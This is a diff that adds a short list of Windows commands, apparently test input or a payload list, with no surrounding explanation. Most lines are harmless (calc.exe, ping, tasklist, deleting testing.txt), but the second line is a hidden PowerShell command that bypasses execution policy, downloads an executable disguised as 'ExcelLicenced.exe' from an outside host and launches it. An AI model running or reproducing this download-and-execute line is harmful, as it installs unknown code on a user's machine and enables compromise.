@@ -1,0 +1,5 @@
+calc.exe
+powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://higee.net/abc/ExcelLicenced.exe','ExcelLicenced.exe');(New-Object -com Shell.Application).ShellExecute('ExcelLicenced.exe');
+ping facebook.com
+tasklist
+del testing.txt
